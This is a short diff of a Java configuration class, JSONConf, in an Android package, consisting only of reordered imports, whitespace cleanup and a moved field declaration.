@@ -9,31 +9,30 @@
 
 package com.android.syssetup.conf;
 
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.text.DateFormat;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.TimeZone;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.Check;
-
 /**
  * Interface used by AgentConf and EventConf
- * 
+ *
  * @author zeno
- * 
  */
 public abstract class JSONConf {
 	private static final String TAG = "JSONConf";
-
-	protected String type;
-
-	/** Parameters. */
+	/**
+	 * Parameters.
+	 */
 	private final JSONObject params;
+	protected String type;
 
 	public JSONConf(String type, JSONObject params) {
 		this.params = params;
